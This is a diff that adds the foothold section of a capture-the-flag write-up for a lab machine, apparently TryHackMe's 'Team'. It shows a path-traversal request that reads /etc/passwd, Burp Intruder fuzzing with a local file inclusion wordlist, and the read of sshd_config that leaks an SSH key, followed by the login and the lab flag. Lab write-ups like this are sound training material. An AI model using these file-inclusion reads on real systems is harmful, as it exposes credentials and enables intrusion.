@@ -142,3 +142,53 @@ Works! We see `dale`, `gyles` and some `ftpuser`. Interesting. Our first target 
 
 ## Foothold
 
+Okay. Since there was a `ssh` port open, we can assume `dale` is the username of that (It could br for `ftp` as well, who knows!).
+
+So, we are looking for either the password of dale, or a private key. Since we have no better option currently, we can bruteforce paths using `burpsuite`. Turn on `foxy-proxy` or any other tool you use, and fire up `burp`.
+
+Intercept a request, copypaste it. It looks like
+
+```
+GET /script.php?page=../../../../etc/passwd HTTP/1.1
+
+Host: dev.team.thm
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+```
+
+Now, go to the `intruder` tab, and setup as the following:
+
+![](https://i.imgur.com/JfUKF2w.png)
+
+![](https://i.imgur.com/A9qcD6D.png)
+
+![](https://i.imgur.com/HgfY6eP.png)
+
+I've put in the payload from [here](https://raw.githubusercontent.com/hussein98d/LFI-files/master/list.txt)
+
+Now, you can let it run, but community edition sucks for this. Speed is shit and the thing we are looking for, is towards the bottom of the list. Let me save you some trouble, the path we are looking for, is `/etc/ssh/sshd_config`. The url thus being `http://dev.team.thm/script.php?page=../../../../etc/ssh/sshd_config`
+
+![](https://i.imgur.com/UZN47TX.png)
+
+We see the sweet sweet private key, which means we can get in! Since the formatting is shit, go the source and the copy-paste it. Yeet all the '#' in the starting. 
+
+We are in! 
+
+```
+❯ ssh dale@10.10.82.31 -i temp
+Last login: Mon Jan 18 10:51:32 2021
+dale@TEAM:~$ ls
+user.txt
+dale@TEAM:~$ cat user.txt
+THM{HELL YEAH}
+```
+
+We are done!
+
+## Priv Esc
+
